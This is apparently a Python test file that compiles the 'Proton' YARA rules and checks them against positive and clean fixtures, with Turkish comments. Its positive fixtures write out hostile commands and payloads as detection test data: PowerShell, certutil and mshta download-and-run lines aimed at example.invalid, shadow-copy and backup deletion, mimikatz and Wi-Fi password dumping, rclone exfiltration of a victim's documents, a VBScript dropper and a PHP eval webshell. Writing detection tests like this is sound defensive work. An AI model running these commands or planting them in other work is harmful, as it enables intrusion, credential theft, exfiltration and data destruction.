#!/usr/bin/env python3
"""Compile Proton YARA sources and verify conservative match thresholds.

The canonical detection set lives in ``production-base/rules``; that is the
directory the daily release workflow packages, so it is the directory this test
compiles. Every rule family is expected to have at least one positive fixture
here, and the clean-file fixtures below must not trigger any of them.
"""

from pathlib import Path

import yara


RULE_DIRECTORY = Path(__file__).resolve().parent / "production-base" / "rules"

MZ = b"MZ" + (b"X" * 40)
OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + (b"\x00" * 24)


def matched_names(rules: yara.Rules, sample: bytes) -> set[str]:
    return {match.rule for match in rules.match(data=sample)}


def words(*parts: bytes) -> bytes:
    """Build command-like fixtures at runtime, never in the invoking shell command line."""
    return b" ".join(parts)


POSITIVE_CASES: dict[str, tuple[bytes, str]] = {
    # --- Var olan davranissal temel ---------------------------------------
    "injection": (
        MZ + b"VirtualAllocEx WriteProcessMemory CreateRemoteThread",
        "Proton_Process_Injection_Primitives",
    ),
    "credential": (
        MZ + b"lsass.exe MiniDumpWriteDump SeDebugPrivilege",
        "Proton_Credential_Dump_Primitives",
    ),
    "powershell": (
        words(b"powershell", b"-EncodedCommand", b"AAA", b"Invoke-Expression"),
        "Proton_Encoded_PowerShell_Download_Chain",
    ),
    "persistence": (
        words(b"reg", b"add", b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", b"/d", b"cmd.exe"),
        "Proton_Windows_Run_Key_Persistence_Chain",
    ),
    "recovery": (
        words(b"vssadmin", b"delete", b"shadows", b"/all;")
        + b"; "
        + words(b"wbadmin", b"delete", b"catalog", b"-quiet"),
        "Proton_Recovery_Inhibition_Command_Cluster",
    ),
    "ransomware": (
        words(b"vssadmin", b"delete", b"shadows", b"/all") + b"; "
        + words(b"wevtutil", b"cl", b"System") + b"; "
        + words(b"bcdedit", b"/set", b"recoveryenabled", b"no"),
        "Proton_Ransomware_Recovery_Destruction_Chain",
    ),

    # --- Yukleyici ve damlaliklar -----------------------------------------
    "shellcode_loader": (
        MZ + b"VirtualAlloc VirtualProtect CreateThread RtlMoveMemory",
        "Proton_Shellcode_Alloc_Execute_Primitives",
    ),
    "hollowing": (
        MZ + b"NtUnmapViewOfSection CreateProcessW SetThreadContext "
             b"WriteProcessMemory ResumeThread",
        "Proton_Process_Hollowing_Chain",
    ),
    "reflective_dll": (
        b"ReflectiveLoader LoadLibraryA GetProcAddress",
        "Proton_Reflective_DLL_Loader_Artifacts",
    ),
    "direct_syscalls": (
        MZ + b"NtAllocateVirtualMemory NtWriteVirtualMemory "
             b"NtProtectVirtualMemory NtCreateThreadEx",
        "Proton_Direct_Syscall_Stub_Loader",
    ),
    "dotnet_pinvoke": (
        MZ + b"mscoree.dll DllImportAttribute VirtualAllocEx "
             b"WriteProcessMemory CreateRemoteThread",
        "Proton_Dotnet_PInvoke_Injection_Surface",
    ),

    # --- Savunma atlatma ---------------------------------------------------
    "amsi_patch": (
        b"AmsiScanBuffer amsi.dll VirtualProtect",
        "Proton_Amsi_Patch_Bypass",
    ),
    "etw_patch": (
        b"EtwEventWrite NtTraceEvent VirtualProtect",
        "Proton_Etw_Provider_Disable",
    ),
    "defender_tamper": (
        words(b"Set-MpPreference", b"-DisableRealtimeMonitoring", b"$true"),
        "Proton_Security_Service_Tamper_Commands",
    ),
    "byovd": (
        b"RTCore64.sys NtLoadDriver CreateService",
        "Proton_Vulnerable_Driver_Abuse_Byovd",
    ),
    "uac_bypass": (
        b"Software\\Classes\\ms-settings\\shell\\open\\command fodhelper.exe",
        "Proton_Uac_Bypass_Auto_Elevate_Chain",
    ),

    # --- LOLBin kotuye kullanimi ------------------------------------------
    "certutil": (
        words(b"certutil", b"-urlcache", b"-split", b"-f", b"http://example.invalid/a.bin"),
        "Proton_Certutil_Download_Or_Decode_Abuse",
    ),
    "mshta": (
        words(b"mshta", b"http://example.invalid/a.hta"),
        "Proton_Mshta_Remote_Script_Execution",
    ),
    "regsvr32": (
        words(b"regsvr32", b"/s", b"/i:http://example.invalid/a.sct", b"scrobj.dll"),
        "Proton_Regsvr32_Scriptlet_Squiblydoo",
    ),
    "wmic": (
        words(b"wmic", b"/node:10.0.0.5", b"process", b"call", b"create", b"cmd.exe"),
        "Proton_Wmic_Remote_Process_And_Xsl_Abuse",
    ),
    "ps_cradle": (
        words(b"powershell", b"-nop", b"-w", b"hidden")
        + b" IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')",
        "Proton_Powershell_Download_Cradle_Variants",
    ),

    # --- Betik damlaliklari ------------------------------------------------
    "vbs_dropper": (
        b'Set h = CreateObject("MSXML2.XMLHTTP")\r\n'
        b'Set s = CreateObject("ADODB.Stream")\r\n'
        b'h.Open "GET", u, False\r\n'
        b"s.Write h.responseBody\r\n"
        b"s.SaveToFile p\r\n"
        b'CreateObject("WScript.Shell").Run p\r\n',
        "Proton_Vbscript_Downloader_Chain",
    ),
    "hta_loader": (
        b'<hta:application windowState="minimize" showInTaskbar="no">'
        b'<script>new ActiveXObject("WScript.Shell").Run("powershell");</script>',
        "Proton_Hta_Application_Loader",
    ),
    "clickfix": (
        b"navigator.clipboard.writeText(cmd);"
        b"<p>Verify you are human: Press Windows + R then Ctrl + V</p>"
        b"<!-- powershell -->",
        "Proton_ClickFix_Clipboard_Social_Engineering",
    ),

    # --- Belge tabanli saldirilar -----------------------------------------
    "ole_macro": (
        OLE + b'AutoOpen Shell("cmd.exe") CreateObject("WScript.Shell")',
        "Proton_Ole_Macro_Autoexec_Shell",
    ),
    "xlm_macro": (
        OLE + b"Excel 4.0 Macro =EXEC( =CALL( URLDownloadToFileA",
        "Proton_Excel4_Xlm_Macro_Abuse",
    ),

    # --- Kimlik avi ve HTML kacakciligi -----------------------------------
    "html_smuggling": (
        b"var b = new Blob([new Uint8Array(atob(d).split('').map("
        b"function(c){return c.charCodeAt(0);}))], "
        b"{type:'application/octet-stream'});"
        b"var a = document.createElement('a');"
        b"a.href = URL.createObjectURL(b); a.download = 'invoice.exe'; a.click();",
        "Proton_Html_Smuggling_Blob_Download",
    ),

    # --- Kimlik bilgisi erisimi -------------------------------------------
    "mimikatz": (
        b"privilege::debug sekurlsa::logonpasswords",
        "Proton_Mimikatz_Command_Surface",
    ),
    "lsass_dump": (
        b"lsass.exe MiniDumpWriteDump SeDebugPrivilege lsass.dmp",
        "Proton_Lsass_Memory_Dump_Techniques",
    ),
    "wifi_dump": (
        words(b"netsh", b"wlan", b"show", b"profile", b"name=Home", b"key=clear"),
        "Proton_Wifi_And_Local_Password_Dump_Commands",
    ),

    # --- Kalicilik ---------------------------------------------------------
    "autorun_registry": (
        b"Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        b"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce "
        + words(b"reg", b"add") + b" %APPDATA%",
        "Proton_Registry_Autorun_Multi_Location",
    ),
    "wmi_subscription": (
        b"__EventFilter CommandLineEventConsumer __FilterToConsumerBinding",
        "Proton_Wmi_Event_Subscription_Persistence",
    ),

    # --- C2 ve uzaktan erisim ---------------------------------------------
    "asyncrat": (
        b"AsyncRAT Server certificate blob",
        "Proton_AsyncRat_Family_Artifacts",
    ),
    "quasar": (
        b"Quasar.Client GetKeyloggerLogsResponse",
        "Proton_Quasar_Family_Artifacts",
    ),
    "reverse_shell": (
        MZ + b"WSASocketA WSAConnect STARTF_USESTDHANDLES hStdInput "
             b"cmd.exe CreateProcess",
        "Proton_Reverse_Shell_Socket_Redirect",
    ),

    # --- Sizdirma ve yayilim ----------------------------------------------
    "rclone_exfil": (
        words(b"rclone", b"copy", b"C:\\Users\\victim\\Documents", b"remote:drop",
              b"--transfers", b"8", b"--ignore-existing"),
        "Proton_Cloud_Sync_Tool_Silent_Exfiltration",
    ),
    "dns_tunnel": (
        b"dnscat client handshake",
        "Proton_Dns_Tunneling_Client",
    ),
    "tor_bundle": (
        MZ + b"torrc SOCKSPort 127.0.0.1:9050 SW_HIDE",
        "Proton_Tor_Hidden_Service_Client_Bundle",
    ),
    "usb_worm": (
        MZ + b"GetLogicalDriveStrings GetDriveType DRIVE_REMOVABLE "
             b"[autorun] shellexecute= CopyFileW SetFileAttributes "
             b"FILE_ATTRIBUTE_HIDDEN",
        "Proton_Removable_Drive_Autorun_Worm",
    ),

    # --- Fidye ve imha -----------------------------------------------------
    "ransom_note": (
        b"All your files are encrypted. Pay in bitcoin and contact us on our "
        b"support page at example.onion",
        "Proton_Ransom_Note_Language_Template",
    ),
    "shadow_destruction": (
        words(b"vssadmin", b"delete", b"shadows", b"/all") + b" && "
        + words(b"wbadmin", b"delete", b"catalog", b"-quiet"),
        "Proton_Shadow_Copy_And_Backup_Destruction",
    ),
    "disk_wiper": (
        MZ + b"\\\\.\\PhysicalDrive0 FSCTL_LOCK_VOLUME SetFilePointerEx "
             b"WriteFile CryptGenRandom ExitWindowsEx",
        "Proton_Disk_Wiper_Raw_Overwrite",
    ),

    # --- Madencilik --------------------------------------------------------
    "xmrig": (
        b'xmrig config "donate-level": 1',
        "Proton_Xmrig_Miner_Artifacts",
    ),
    "stratum_pool": (
        b'stratum+tcp://pool.invalid:3333 {"method":"login"}',
        "Proton_Mining_Pool_Stratum_Configuration",
    ),

    # --- Web kabuklari -----------------------------------------------------
    "php_webshell": (
        b'<?php @eval(base64_decode($_POST["x"])); ?>',
        "Proton_Php_Eval_Request_Webshell",
    ),
}


# Temiz dosya korpusu: yonetim betikleri, normal belgeler ve olagan web
# icerigi. Hicbiri yukaridaki kurallardan birine dusmemeli.
NEGATIVE_SAMPLES: tuple[bytes, ...] = (
    b"ordinary application configuration and documentation",
    MZ + b"VirtualAlloc only",
    MZ + b"CreateProcessW ResumeThread",
    b"powershell Write-Output hello",
    words(b"reg", b"query", b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    words(b"vssadmin", b"list", b"shadows"),
    words(b"wevtutil", b"gli", b"System"),
    words(b"bcdedit", b"/enum", b"all"),
    words(b"certutil", b"-hashfile", b"setup.exe", b"SHA256"),
    words(b"netsh", b"wlan", b"show", b"profiles"),
    words(b"schtasks", b"/query", b"/fo", b"list"),
    words(b"rclone", b"lsd", b"remote:"),
    b"<?php echo htmlspecialchars($_GET['name']); ?>",
    b"<a href='/files/report.pdf' download>Rapor</a>",
    b"const response = await fetch('/api/v1/status'); const data = await response.json();",
    OLE + b"Word.Document.8 normal belge icerigi",
    b"Set-MpPreference -ScanScheduleDay Everyday",
    b"Backup completed. All your files are safe.",
    b"import yara\nrules = yara.compile(filepaths=paths)\n",
    MZ + b"mscoree.dll System.Windows.Forms Button Click",
)


def main() -> None:
    paths = {path.stem: str(path) for path in sorted(RULE_DIRECTORY.glob("*.yar"))}
    if not paths:
        raise SystemExit(f"Kural dosyasi bulunamadi: {RULE_DIRECTORY}")
    rules = yara.compile(filepaths=paths)

    expected_names = {expected for _sample, expected in POSITIVE_CASES.values()}

    failures: list[str] = []
    for label, (sample, expected) in POSITIVE_CASES.items():
        matches = matched_names(rules, sample)
        if expected not in matches:
            failures.append(f"pozitif '{label}': {expected} beklendi, alinan: {sorted(matches)}")

    for index, sample in enumerate(NEGATIVE_SAMPLES):
        matches = matched_names(rules, sample).intersection(expected_names)
        if matches:
            failures.append(f"negatif #{index}: yanlis pozitif {sorted(matches)}")

    if failures:
        raise SystemExit("Proton kural testi basarisiz:\n  " + "\n  ".join(failures))

    print(
        f"Proton YARA kural testi: OK "
        f"({len(paths)} dosya, {len(POSITIVE_CASES)} pozitif, "
        f"{len(NEGATIVE_SAMPLES)} negatif fixture)"
    )


if __name__ == "__main__":
    main()
